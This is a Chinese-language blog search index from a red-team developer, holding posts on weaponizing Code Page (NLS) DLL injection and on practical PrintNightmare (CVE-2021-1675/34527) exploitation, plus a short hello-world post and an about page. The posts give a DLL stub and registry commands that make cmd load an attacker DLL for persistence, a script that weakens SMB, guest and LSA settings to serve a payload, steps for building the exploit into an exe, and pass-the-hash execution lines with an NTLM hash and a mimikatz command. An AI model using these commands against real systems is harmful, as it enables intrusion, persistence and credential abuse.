<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Code Page注入方法的武器化</title>
    <link href="/CodePage_injection/"/>
    <url>/CodePage_injection/</url>
    
    <content type="html"><![CDATA[<h1 id="起源"><a href="#起源" class="headerlink" title="起源"></a>起源</h1><p>一年多以前，<a href="https://twitter.com/jonasLyk">Jonas L</a>在<a href="https://twitter.com/jonasLyk/status/1352729173631135751">推特</a>首次提出了这个注入方法，并在评论区提出了一些可能的利用方法。半年前，有人在GitHub发布了一份<a href="https://github.com/NtQuerySystemInformation/NlsCodeInjectionThroughRegistry">Poc</a>，某种程度上进行了对注入方案的验证。</p><h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>控制台程序，会有一个对应的Code Page，也就是代码页，这个东西是字符代码的一个映射，每个控制台对应两个代码页，一个输入一个输出。</p><p>大部分Code Page都是nls文件，但是看到有一部分是dll文件，确切地说是5开头的五位数对应的部分（此处未经逆向，仅通过测试进行判断，如有错误，还请见谅）。通过修改或添加一个符合条件的代码页，就可以让使用这个代码页的进程加载这个dll。</p><p>根据文档，这个dll需要有一个名称为NlsDllCodePageTranslation的导出函数，来保证其正常加载。</p><p>在Jonas L的推特帖子中，使用控制台作为示例，直接通过chcp命令进行了演示，这也是最简单的一个实现方法。而后在评论区提到了SetThreadLocale、WM_INPUTLANGCHANGE等方法。后面出现的poc使用了SetThreadLocale的思路，但是由于api的限制，这个poc还使用了远程线程注入，所以只适合作为一个演示使用，并不适合在实战环境利用。</p><h1 id="武器化思路"><a href="#武器化思路" class="headerlink" title="武器化思路"></a>武器化思路</h1><p>SetThreadLocale仅支持对当前线程进行修改，而WM_INPUTLANGCHANGE需求也较为苛刻。</p><p>所以，针对已有进程进行注入并不现实，剩下就是对新进程的注入，也就是通常说的spawn。</p><p>先考虑dll的问题，每次单独生成dll是不现实的，未经测试的陌生文件直接落地太不尊重目标机器的防护软件了。所以要考虑的就是使用一个通用的dll去加载指定位置的模块（dll或shellcode），所以可以制作一个从注册表、文件、环境变量等地方读取payload再加载的dll作为落地的文件。需要导出的NlsDllCodePageTranslation函数可以直接转发。</p><p>确定了文件的方案之后，就是修改代码页的问题。首先是添加带有自己dll的代码页，经过查询<a href="https://learn.microsoft.com/en-us/windows/console/console-code-pages">文档</a>可以得知，修改 <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Nls\CodePage</code>即可。（这里的注册表键值默认路径是在对应的system32或者syswow64路径，可以通过..\回到上级目录，这里我选择的上级的Temp目录放置文件）</p><p>而后考虑修改程序对应的代码页，这里有两种方法：</p><ul><li>如果直接选用cmd、powershell或类似的控制台程序作为spawn对象，可以在创建进程时指定将输入输出重定向（就是大部分远控或c2的远程shell实现原理），并输入chcp指令触发加载。</li><li>更通用的<a href="https://devblogs.microsoft.com/commandline/understanding-windows-console-host-settings/">方案</a>是修改HKEY_CURRENT_USER\Console里的注册表项，添加控制台程序路径，并指定其使用的Code Page。</li></ul><p>如果为了临时使用，可以使用第一种，如果想集成进现有框架，可以考虑第二个。第二个方案也可以作为一种被动触发的权限维持方案使用，适合针对运维人员。</p><p>至此，整套方案就已经可以投入使用了，但是存在一些缺点，使用时要注意</p><ol><li>目标进程必须是控制台进程</li><li>添加代码页需要管理员权限（添加一次即可，后续不再需要管理员权限）</li><li>dll会落地，要考虑免杀</li><li>不能用作inject，只能用于spawn</li></ol><h1 id="总结（演示）"><a href="#总结（演示）" class="headerlink" title="总结（演示）"></a>总结（演示）</h1><p>首先制作一个dll文件（注意位数），示例代码：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/export:NlsDllCodePageTranslation=\&quot;C:\\Windows\\System32\\C_gsm7.NlsDllCodePageTranslation\&quot;&quot;</span>)</span><br><span class="hljs-comment">//#pragma comment(linker, &quot;/export:NlsDllCodePageTranslation=\&quot;C:\\Windows\\Syswow64\\C_gsm7.NlsDllCodePageTranslation\&quot;&quot;)</span><br><br><span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">(HMODULE hModule,</span></span><br><span class="hljs-params"><span class="hljs-function">    DWORD  ul_reason_for_call,</span></span><br><span class="hljs-params"><span class="hljs-function">    LPVOID lpReserved</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">switch</span> (ul_reason_for_call)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>    &#123;<br>        <span class="hljs-comment">//Do Something You Want</span><br>    &#125;<br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><p>将文件放置在C:\Windows\Temp中，并打开cmd输入如下命令行(记得修改第一行最后的文件名)：</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">reg <span class="hljs-keyword">add</span><span class="language-bash"> <span class="hljs-string">&quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Nls\CodePage&quot;</span> /v 55555 /d <span class="hljs-string">&quot;..\Temp\qwqdanchun.dll&quot;</span> /f</span><br><br>reg <span class="hljs-keyword">add</span><span class="language-bash"> <span class="hljs-string">&quot;HKEY_CURRENT_USER\Console\%SystemRoot%_system32_cmd.exe&quot;</span> /f</span><br><br>reg <span class="hljs-keyword">add</span><span class="language-bash"> <span class="hljs-string">&quot;HKEY_CURRENT_USER\Console\%SystemRoot%_system32_cmd.exe&quot;</span>  /v CodePage /t REG_DWORD /d 55555 /f</span><br></code></pre></td></tr></table></figure><p>之后每次启动cmd都会加载这个dll。如果使用其他控制台程序，修改后两行的注册表项的名称即可。</p>]]></content>
    
    
    <categories>
      
      <category>注入</category>
      
    </categories>
    
    
    <tags>
      
      <tag>注入</tag>
      
      <tag>CodePage</tag>
      
      <tag>NLS</tag>
      
      <tag>武器化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PrintNightmare 实战利用Tips</title>
    <link href="/PrintNightmare/"/>
    <url>/PrintNightmare/</url>
    
    <content type="html"><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a><strong>概述</strong></h1><p><strong>CVE-2021-1675 &#x2F; CVE-2021-34527 这两个洞本质上就是一个洞，只是因为修复的问题分配了两个编号。具体的漏洞分析就不赘述了，很早就有人发过，没必要炒冷饭，这里只总结下实际使用时可能出现的问题，以及很多poc中不会提到的细节</strong></p><h1 id="复现攻击环境"><a href="#复现攻击环境" class="headerlink" title="复现攻击环境"></a>复现攻击环境</h1><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><h3 id="1-域相关"><a href="#1-域相关" class="headerlink" title="1.域相关"></a>1.域相关</h3><p>目标机器为域内Windows Server机器时，攻击机必须为同一域内的机器；目标机器为非域环境Windows Server机器时，攻击机器为目标机器可以访问到的另一机器即可</p><blockquote><p>加入域后的Windows系统访问外部资源会携带已登录的域用户凭证，所以未加入域且未提前指定凭据的的SMB就无法访问。因此攻击域内机器有此限制</p></blockquote><h3 id="2-SMBv1"><a href="#2-SMBv1" class="headerlink" title="2.SMBv1"></a>2.SMBv1</h3><p>攻击机器为Windows Server 2019及更高版本时，需要执行 <code>Enable-WindowsOptionalFeature -Online -FeatureName smb1protocol</code>并重启去开启SMBv1，否则有可能出现rpc_s_access_denied的问题，攻击机器为2016及更低版本的系统时，可以直接使用 <code>Set-SmbServerConfiguration -EnableSMB1Protocol $true</code>开启SMBv1的支持</p><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h3 id="1-准备payload"><a href="#1-准备payload" class="headerlink" title="1.准备payload"></a>1.准备payload</h3><p>在攻击机器创建C:\share文件夹，并将dll放入其中（此路径可根据需求修改，修改后下一步脚本自行对应修改）</p><h3 id="2-开启SMB匿名共享"><a href="#2-开启SMB匿名共享" class="headerlink" title="2.开启SMB匿名共享"></a>2.开启SMB匿名共享</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><br><span class="hljs-comment">#修改路径权限，使所有人可读</span><br>icacls C:\share\ /T /grant Anonymous` logon:F<br>icacls C:\share\ /T /grant Everyone:F<br><span class="hljs-comment">#创建名称为share路径为C:\share的SMB共享</span><br><span class="hljs-built_in">New-SmbShare</span> <span class="hljs-literal">-Path</span> C:\share <span class="hljs-literal">-Name</span> share <span class="hljs-literal">-FullAccess</span> <span class="hljs-string">&#x27;ANONYMOUS LOGON&#x27;</span>,<span class="hljs-string">&#x27;Everyone&#x27;</span><br><span class="hljs-comment">#启用guest用户</span><br>net user guest /active:yes<br><span class="hljs-comment">#覆盖已有的NullSessionPipes配置</span><br>REG ADD <span class="hljs-string">&quot;HKLM\System\CurrentControlSet\Services\LanManServer\Parameters&quot;</span> /v NullSessionPipes /t REG_MULTI_SZ /d srvsvc /f<br><span class="hljs-comment">#设置可以匿名访问共享</span><br>REG ADD <span class="hljs-string">&quot;HKLM\System\CurrentControlSet\Services\LanManServer\Parameters&quot;</span> /v NullSessionShares /t REG_MULTI_SZ /d share /f<br><span class="hljs-comment">#设置Everyone权限包含匿名登录用户</span><br>REG ADD <span class="hljs-string">&quot;HKLM\System\CurrentControlSet\Control\Lsa&quot;</span> /v EveryoneIncludesAnonymous /t REG_DWORD /d <span class="hljs-number">1</span> /f<br><span class="hljs-comment">#设置任何用户都可以通过网络获取本机的信息</span><br>REG ADD <span class="hljs-string">&quot;HKLM\System\CurrentControlSet\Control\Lsa&quot;</span> /v RestrictAnonymous /t REG_DWORD /d <span class="hljs-number">0</span> /f<br><span class="hljs-comment">#提取本地安全组策略</span><br>secedit /export /cfg gp.inf /quiet<br><span class="hljs-comment">#修改组策略中的指定权限</span><br>(<span class="hljs-built_in">Get-Content</span> gp.inf) <span class="hljs-operator">-replace</span> <span class="hljs-string">&quot;SeDenyNetworkLogonRight = Guest&quot;</span>,<span class="hljs-string">&quot;SeDenyNetworkLogonRight = &quot;</span> | <span class="hljs-built_in">Set-Content</span> <span class="hljs-string">&quot;gp.inf&quot;</span><br><span class="hljs-comment">#导入本地安全组策略</span><br>secedit /configure /db gp.sdb /cfg gp.inf /quiet<br><span class="hljs-comment">#更新本地安全组策略</span><br>CMD.EXE /C <span class="hljs-string">&quot;gpupdate/force&quot;</span><br><span class="hljs-comment">#清理文件</span><br>CMD.EXE /C <span class="hljs-string">&quot;del gp.inf&quot;</span><br>CMD.EXE /C <span class="hljs-string">&quot;del gp.sdb&quot;</span><br></code></pre></td></tr></table></figure><p>注：此脚本修改自<a href="https://github.com/3gstudent/Invoke-BuildAnonymousSMBServer">Invoke-BuildAnonymousSMBServer</a></p><h3 id="3-准备exp"><a href="#3-准备exp" class="headerlink" title="3.准备exp"></a>3.准备exp</h3><h4 id="选择exp"><a href="#选择exp" class="headerlink" title="选择exp"></a>选择exp</h4><p>推荐exp为<a href="https://github.com/cube0x0/CVE-2021-1675/blob/main/CVE-2021-1675.py">CVE-2021-1675.py</a>，主要优势在于可以使用hash进行攻击，现在越来越难搞到密码了，hash的场景更多</p><p>因为大部分目标环境不会有python环境，所以最好打包为exe使用</p><h4 id="打包exe"><a href="#打包exe" class="headerlink" title="打包exe"></a>打包exe</h4><p>打包使用Windows Server 2008 R2机器，安装<a href="https://www.python.org/ftp/python/3.8.10/python-3.8.10-amd64.exe">Python3.8</a>，<a href="https://github.com/git-for-windows/git/releases/download/v2.38.1.windows.1/Git-2.38.1-64-bit.exe">Git</a>，之后执行以下命令</p><blockquote><p><em>Windows Server 2008 R2以保证大部分系统能正常运行，Python版本推荐3.8.10，可低不可高</em></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/cube0x0/impacket<br><span class="hljs-built_in">cd</span> impacket<br>certutil -urlcache -<span class="hljs-built_in">split</span> -f https://raw.githubusercontent.com/cube0x0/CVE-2021-1675/main/CVE-2021-1675.py CVE-2021-1675.py<br>pip3 install six pycryptodomex pyasn1 pyinstaller<br>pyinstaller --clean --onefile CVE-2021-1675.py<br></code></pre></td></tr></table></figure><p>生成的文件在 <code>\impacket\dist\CVE-2021-1675.exe</code></p><h3 id="4-执行"><a href="#4-执行" class="headerlink" title="4.执行"></a>4.执行</h3><p>示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">CVE-2021-1675.exe hackit.local/domain_user:Pass123@192.168.1.10 <span class="hljs-string">&quot;\\192.168.1.215\share\addCube.dll&quot;</span><br><br>CVE-2021-1675.exe hackit.local/domain_user:Pass123@192.168.1.10 <span class="hljs-string">&quot;\\192.168.1.215\share\addCube.dll&quot;</span> <span class="hljs-string">&quot;C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL&quot;</span><br><br>CVE-2021-1675.exe hackit.local/domain_user@192.168.1.10 -hashes :f0cff78ea8d2d87e5d1caccf01d0bd2f <span class="hljs-string">&quot;\\192.168.1.215\share\addCube.dll&quot;</span><br><br>CVE-2021-1675.exe hackit.local/domain_user@192.168.1.10 -hashes :f0cff78ea8d2d87e5d1caccf01d0bd2f <span class="hljs-string">&quot;\\192.168.1.215\share\addCube.dll&quot;</span> <span class="hljs-string">&quot;C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL&quot;</span><br><br>CVE-2021-1675.exe domain_user:Pass123@192.168.1.10 <span class="hljs-string">&quot;\\192.168.1.215\share\addCube.dll&quot;</span><br><br>CVE-2021-1675.exe domain_user:Pass123@192.168.1.10 <span class="hljs-string">&quot;\\192.168.1.215\share\addCube.dll&quot;</span> <span class="hljs-string">&quot;C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL&quot;</span><br><br>CVE-2021-1675.exe domain_user@192.168.1.10 -hashes :f0cff78ea8d2d87e5d1caccf01d0bd2f <span class="hljs-string">&quot;\\192.168.1.215\share\addCube.dll&quot;</span><br><br>CVE-2021-1675.exe domain_user@192.168.1.10 -hashes :f0cff78ea8d2d87e5d1caccf01d0bd2f <span class="hljs-string">&quot;\\192.168.1.215\share\addCube.dll&quot;</span> <span class="hljs-string">&quot;C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL&quot;</span><br></code></pre></td></tr></table></figure><h1 id="武器化思路"><a href="#武器化思路" class="headerlink" title="武器化思路"></a>武器化思路</h1><p>按照上文的方法已经足够应付大多数攻击场景了，但是如果从武器化开发的角度来看，pyinstaller这东西还是太不优雅了，所以我们回头看向了另一份poc，<a href="https://github.com/cube0x0/CVE-2021-1675/tree/main/SharpPrintNightmare/SharpPrintNightmare">SharpPrintNightmare</a>，对这份代码稍作修改即可实现使用hash验证身份的功能</p><h2 id="1-背景介绍"><a href="#1-背景介绍" class="headerlink" title="1.背景介绍"></a>1.背景介绍</h2><p>Pass The Hash这项技术实现起来，有两种思路，一种是自己构造包然后发包完成验证，另一种是修改自己进程或线程内存中保存的身份验证信息并修改。</p><h2 id="2-确定思路"><a href="#2-确定思路" class="headerlink" title="2.确定思路"></a>2.确定思路</h2><p>为了方便开发，这里选用第二种方法。毕竟去翻RPC和SMB的文档是一个很让人头疼的事……</p><p>而第二种方法的典型案例就是mimikatz，所以首先使用mimikatz进行简单的测试</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">sekurlsa::pth /user:John /domain:192.168.0.111 /ntlm:f0cff78ea8d2d87e5d1caccf01d0bd2f /run:&quot;SharpPrintNightmare.exe&quot;<br><br>注：为了方便测试，此处我已经修改SharpPrintNightmare代码，并写死了参数<br></code></pre></td></tr></table></figure><p>可以发现思路可行，确定了patch的方案</p><p>mimikatz有一个C#的版本<a href="https://github.com/b4rtik/SharpKatz">SharpKatz</a>，<del>抄袭</del>参考其中pth功能的实现代码即可</p><p>SharpKatz中的此部分代码基本完全由mimikatz的代码翻译而成，建议先看其中任意一个的代码了解下原理。</p><p>总结后需要对SharpPrintNightmare进行的修改为：</p><ul><li>添加pth选项，进行参数判断</li><li>修改原项目的Impersonator类，如果使用pth就不再执行LogonUser函数，改为使用SharpKatz中的pth模块的<a href="https://github.com/b4rtik/SharpKatz/blob/87e8e6661999d19bbcae3c0623f78dc2a1a9b45f/SharpKatz/Module/Pth.cs#L34">CreateProcess</a>函数（此处需要将SharpKatz的对应代码集成进来），注意将impersonate设置为true，以便使用当前线程去连接，而不是使用新进程（方便内存加载）</li><li><a href="https://github.com/b4rtik/SharpKatz">SharpKatz</a>的pth中所需的内存查找的特征不全，需要参考mimikatz中的补全</li></ul><p>确定了以上修改方案，再完善一下使用细节，以及对应的文本提示与错误反馈即可完成工具的武器化</p><h2 id="3-成果"><a href="#3-成果" class="headerlink" title="3.成果"></a>3.成果</h2><p>因为各种原因，就不放成品了，有兴趣的可以自己按照步骤修改一遍啦</p>]]></content>
    
    
    <categories>
      
      <category>漏洞</category>
      
    </categories>
    
    
    <tags>
      
      <tag>武器化</tag>
      
      <tag>漏洞复现</tag>
      
      <tag>PrintNightmare</tag>
      
      <tag>CVE-2021-1675</tag>
      
      <tag>CVE-2021-34527</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World Again</title>
    <link href="/hello-world/"/>
    <url>/hello-world/</url>
    
    <content type="html"><![CDATA[<p>历时半个多月，删站的我又决定把博客搭起来了，这次从用了五年的Wordpress换成了Hexo，自动部署的纯静态博客似乎也是不错的</p><p>不过之前的文章没有保存了，很多都是早年写的东西，现在看来已经没有意义了</p><p>后面会尽量恢复记笔记的习惯，也就顺手更一些文章吧，希望我的文章可以帮到你</p>]]></content>
    
    
    <categories>
      
      <category>生活</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
  
  
  <entry>
    <title>about</title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[<p>这里是<em>簞純</em>，一个<del>单纯的</del>日常生产bug再debug的菜鸡红队安全开发，目前主要做Windows下的二进制方向开发</p><p><strong>ID</strong>：<em>簞純 &#x2F; qwqdanchun</em></p><p><strong>Tag</strong>：伪技术宅，干饭人，老二次元，佛系，咕咕咕，夜猫子</p><p><strong>QQ聊天群</strong>：<a href="https://jq.qq.com/?_wv=1027&k=Ok58ZNSd">814084837</a></p>]]></content>
    
  </entry>
  
  
  
</search>
